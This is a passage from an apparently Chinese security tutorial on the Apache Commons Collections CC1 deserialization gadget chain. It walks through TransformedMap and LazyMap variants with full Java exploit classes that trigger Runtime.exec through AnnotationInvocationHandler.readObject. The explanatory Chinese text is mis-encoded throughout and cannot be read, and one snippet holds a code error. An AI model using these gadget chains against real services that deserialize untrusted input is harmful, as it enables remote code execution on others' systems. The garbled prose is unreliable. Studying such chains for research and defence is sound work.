<br>&#125;<br></code></pre></td></tr></table></figure><p>æ³¨æ„æœ€åçš„<code>chainedTransformer.transform(Runtime.class)</code>ï¼Œå¯ä»¥å‘ç°ä¸€ä¸ªé—®é¢˜ï¼šè¿™é‡Œåˆå‡ºç°æœ€åˆçš„<code>transform</code>æ–¹æ³•è°ƒç”¨äº†ã€‚æ‰€ä»¥ç°åœ¨æŠŠ<code>decorate</code>åé¢é‚£äº›ç»™å®ƒæ‹¼ä¸Šå»ï¼šå³é€šè¿‡<code>AnnotationInvocationHandler</code>ä¸‹é‡å†™çš„<code>readObject</code>æ–¹æ³•è°ƒç”¨<code>transform</code>æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ChainedTransformerEXP</span> &#123;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);  <br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, transformedMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†è¿™æ—¶å¹¶ä¸ä¼šå¼¹è®¡ç®—å™¨ï¼Œå› ä¸ºå‰é¢ä¹Ÿè¯´äº†æƒ³è¿›åˆ°<code>setValue</code>æ–¹æ³•å¾—æ»¡è¶³ä¸¤ä¸ªæ¡ä»¶ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) <br>            &#125;<br></code></pre></td></tr></table></figure><p>memeberTypeæ˜¯è·å–æ³¨è§£ä¸­æˆå‘˜å˜é‡çš„åç§°ï¼Œç„¶åå¹¶ä¸”æ£€æŸ¥é”®å€¼å¯¹ä¸­é”®åæ˜¯å¦æœ‰å¯¹åº”çš„åç§°ï¼Œè€Œæˆ‘ä»¬æ‰€ä½¿ç”¨çš„æ³¨è§£æ˜¯æ²¡æœ‰æˆå‘˜å˜é‡çš„ã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ª<code>memberType</code>æ˜¯ä»€ä¹ˆæ„æ€ï¼š</p><p><img src="/img/cc103.png" alt="cc103"></p><p>æˆ‘ä»¬ä¼ å…¥çš„å‚æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Override.class, decorateMap);  <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªæ³¨è§£å¾—æœ‰æˆå‘˜å˜é‡(å³æˆå‘˜çš„ç±»å‹ä¸èƒ½ä¸ºç©ºï¼š<code>memberType != null</code>)ã€‚çœ‹çœ‹<code>@override</code>é‡Œé¢æ˜¯å¦åˆæˆå‘˜å˜é‡ï¼š</p><p><img src="/img/cc104.png" alt="cc104"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ˜¯ä¸ªç©ºçš„ï¼Œä¸è¿‡å¥½åœ¨<code>@Target</code>é‡Œé¢æœ‰ä¸ª<code>value</code></p><p><img src="/img/cc105.png" alt="cc105"></p><p>ç°åœ¨ç¬¬ä¸€ä¸ª<code>if</code>è§£å†³äº†ï¼Œå†çœ‹ç¬¬äºŒä¸ª<code>if</code>ï¼šè¦æ±‚ <code>hashMap.put(&quot;para1&quot;, &quot;para2&quot;)</code> ä¸­çš„ <code>para1</code> ä¸æˆå‘˜å˜é‡ç›¸å¯¹åº”ã€‚è¿™é‡Œç›´æ¥æ”¾å‰é¢çš„<code>value</code>å°±è¡Œã€‚</p><p>è¿™é‡Œç›´æ¥æ”¾DBå¸ˆå‚…çš„å›¾ï¼š</p><p><img src="/img/cc106.png" alt="cc106"></p><p>æœ€åä¸€ä¸ªé—®é¢˜å°±æ˜¯è¿™é‡Œ<code>setValue</code>çš„å‚æ•°ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">memberValue.setValue(<br>                       <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                           value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                               annotationType.members().get(name)));<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸ªå‚æ•°å¹¶ä¸æ˜¯æˆ‘ä»¬æƒ³è¦çš„<code>Runtime.class</code>ï¼Œä¸è¿‡<code>ConstantTransformer</code>ç±»çš„å­˜åœ¨å¯ä»¥å¸®æˆ‘ä»¬è§£å†³è¿™ä¸ªé—®é¢˜ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//ConstantTransformer.java</span><br><span class="hljs-keyword">public</span> <span class="hljs-title function_">ConstantTransformer</span><span class="hljs-params">(Object constantToReturn)</span> &#123;<br>        <span class="hljs-built_in">super</span>();<br>        iConstant = constantToReturn;<br>    &#125;<br><br><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">transform</span><span class="hljs-params">(Object input)</span> &#123;<br>        <span class="hljs-keyword">return</span> iConstant;<br>    &#125;<br></code></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°è¿™ä¸œè¥¿çš„<code>transform</code>æ–¹æ³•ï¼šä¸ç®¡inputä»€ä¹ˆä»–éƒ½åªèƒ½è¿”å›<code>iConstant</code>ï¼Œè€Œ<code>iConstant</code>è¿™ä¸œè¥¿å¯ä»¥åœ¨æ„é€ å‡½æ•°ä¸­å®šä¹‰ã€‚é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥<code>new</code>ä¸€ä¸ª<code>ConstantTransformer(Runtime.class)</code>ï¼Œè¿™æ—¶è°ƒç”¨å®ƒçš„<code>transform</code>æ–¹æ³•æ—¶ä¸ç®¡inputä»€ä¹ˆéƒ½åªèƒ½è¿”å›<code>Runtime.class</code>ã€‚</p><p>æœ€ç»ˆEXP(å‚è€ƒäº†DBå¸ˆå‚…çš„)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> FinalEXP;  <br>  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;  <br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;  <br>  <br><span class="hljs-keyword">import</span> java.io.*;  <br><span class="hljs-keyword">import</span> java.lang.annotation.Target;  <br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;  <br><span class="hljs-keyword">import</span> java.util.HashMap;  <br><span class="hljs-keyword">import</span> java.util.Map;  <br>  <br><span class="hljs-comment">// æœ€ç»ˆçš„ EXPpublic class TransformMapEXP &#123;  </span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;  <br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;  <br>            <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// æ„é€  setValue çš„å¯æ§å‚æ•°  </span><br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>  <br> , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),  <br> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)  <br>        &#125;;  <br> <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);  <br> HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();  <br> hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;drunkbaby&quot;</span>);  <span class="hljs-comment">//è¿™é‡Œé”®æ˜¯valueå°±è¡Œï¼Œå€¼éšä¾¿å†™</span><br> Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);  <br> <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);  <br> <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);  <br> aihConstructor.setAccessible(<span class="hljs-literal">true</span>);  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);  <br>  <br> <span class="hljs-comment">// åºåˆ—åŒ–ååºåˆ—åŒ–  </span><br> serialize(o);  <br> unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;  <br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));  <br> oos.writeObject(obj);  <br> &#125;  <br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;  <br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));  <br> <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();  <br> <span class="hljs-keyword">return</span> obj;  <br> &#125;  <br>&#125;<br><br></code></pre></td></tr></table></figure><p>æ€»ç»“ä¸€ä¸‹è°ƒç”¨é¡ºåºï¼š</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>.readObject -&gt;</span><br> A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>.setValue -&gt;</span><br> T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>.checkSetValue -&gt;</span><br> InvokerTransformer.transform<br></code></pre></td></tr></table></figure><p>æœ€åæ³¨æ„ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java">AnnotationInvocationHandler(Class&lt;? <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Annotation</span>&gt; type, Map&lt;String, Object&gt; memberValues)<br>    <br>    è¿™é‡Œçš„memberValuesæ”¾çš„æ˜¯transformedMapï¼Œæœ€ç»ˆä¼šæ‰§è¡Œçš„æ˜¯memberValue.setValue<br></code></pre></td></tr></table></figure><p><code>AnnotationInvocationHandler.java</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs java">    <span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">readObject</span><span class="hljs-params">(java.io.ObjectInputStream s)</span><br>        <span class="hljs-keyword">throws</span> java.io.IOException, ClassNotFoundException &#123;<br>        s.defaultReadObject();<br><br>        <span class="hljs-comment">// Check to make sure that types have not evolved incompatibly</span><br><br>        <span class="hljs-type">AnnotationType</span> <span class="hljs-variable">annotationType</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            annotationType = AnnotationType.getInstance(type);<br>        &#125; <span class="hljs-keyword">catch</span>(IllegalArgumentException e) &#123;<br>            <span class="hljs-comment">// Class is no longer an annotation type; time to punch out</span><br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">java</span>.io.InvalidObjectException(<span class="hljs-string">&quot;Non-annotation type in annotation serial stream&quot;</span>);<br>        &#125;<br><br>        Map&lt;String, Class&lt;?&gt;&gt; memberTypes = annotationType.memberTypes();<br><br>        <span class="hljs-comment">// If there are annotation members without values, that</span><br>        <span class="hljs-comment">// situation is handled by the invoke method.</span><br>        <span class="hljs-keyword">for</span> (Map.Entry&lt;String, Object&gt; memberValue : memberValues.entrySet()) &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> memberValue.getKey();<br>            Class&lt;?&gt; memberType = memberTypes.get(name);<br>            <span class="hljs-keyword">if</span> (memberType != <span class="hljs-literal">null</span>) &#123;  <span class="hljs-comment">// i.e. member still exists</span><br>                <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> memberValue.getValue();<br>                <span class="hljs-keyword">if</span> (!(memberType.isInstance(value) ||<br>                      value <span class="hljs-keyword">instanceof</span> ExceptionProxy)) &#123;<br>                    memberValue.setValue(<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnnotationTypeMismatchExceptionProxy</span>(<br>                            value.getClass() + <span class="hljs-string">&quot;[&quot;</span> + value + <span class="hljs-string">&quot;]&quot;</span>).setMember(<br>                                annotationType.members().get(name)));<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="CC1-Lazymapç‰ˆ"><a href="#CC1-Lazymapç‰ˆ" class="headerlink" title="CC1 Lazymapç‰ˆ"></a>CC1 Lazymapç‰ˆ</h2><p>é¦–å…ˆï¼Œlazyç±»ä¸‹å­˜åœ¨getæ–¹æ³•ï¼Œè¿™é‡Œè°ƒç”¨äº†<code>transform</code>ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> Object <span class="hljs-title function_">get</span><span class="hljs-params">(Object key)</span> &#123;  <br>    <span class="hljs-comment">// create value for key if key is not currently in the map  </span><br> <span class="hljs-keyword">if</span> (map.containsKey(key) == <span class="hljs-literal">false</span>) &#123;  <br>        <span class="hljs-type">Object</span> <span class="hljs-variable">value</span> <span class="hljs-operator">=</span> factory.transform(key);  <br> map.put(key, value);  <br> <span class="hljs-keyword">return</span> value;  <br> &#125;  <br>    <span class="hljs-keyword">return</span> map.get(key);  <br>&#125;<br></code></pre></td></tr></table></figure><p>transformçš„è¯è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªï¼Œé‡Œé¢çš„å‚æ•°æ”¾ä¸ªç±»å°±è¡Œã€‚å‰é¢çš„factoryå°±æ˜¯<code>invokertransformer</code>ã€‚</p><p>å†å¾€ä¸Šè·Ÿä¸€ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">protected</span> <span class="hljs-keyword">final</span> Transformer factory;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Map <span class="hljs-title function_">decorate</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">LazyMap</span>(map, factory);<br>    &#125;<br><br><span class="hljs-comment">//æ³¨æ„è¿™ä¸ªæ„é€ æ–¹æ³•æ˜¯ç§æœ‰çš„</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Factory factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = FactoryTransformer.getInstance(factory);<br>    &#125;<br><br>    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">LazyMap</span><span class="hljs-params">(Map map, Transformer factory)</span> &#123;<br>        <span class="hljs-built_in">super</span>(map);<br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">IllegalArgumentException</span>(<span class="hljs-string">&quot;Factory must not be null&quot;</span>);<br>        &#125;<br>        <span class="hljs-built_in">this</span>.factory = factory;<br>    &#125;<br><br></code></pre></td></tr></table></figure><p>ç§æœ‰çš„æ„é€ æ–¹æ³•ï¼Œè¿˜å­˜åœ¨<code>decorate</code>è¿™ä¸ªé™æ€æ–¹æ³•å¯ä»¥å®ä¾‹åŒ–å‡ºä¸€ä¸ª<code>Lazymap</code>ã€‚</p><p>å…ˆåˆ©ç”¨ç°æœ‰çš„ä¸œè¥¿è°ƒä¸ªè®¡ç®—å™¨ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1_REAL1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">Runtime</span> <span class="hljs-variable">runtime</span> <span class="hljs-operator">=</span> Runtime.getruntime();<br><br>        <span class="hljs-type">InvokerTransformer</span> <span class="hljs-variable">invokerTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span><br>                , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;);<br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">decoratemp</span> <span class="hljs-operator">=</span> LazyMap.decorate(hashMap,invokerTransformer);<br>        <span class="hljs-comment">//è¿™é‡Œå…¶å®æ˜¯å§factoryèµ‹å€¼ä¸ºinvokerTransformer</span><br>        <span class="hljs-comment">//å…¶å®æœ€ç»ˆçš„ç›®çš„è¿˜æ˜¯è°ƒç”¨invokerTransformer.transform(runtime)ï¼</span><br><br>        Class&lt;LazyMap&gt; 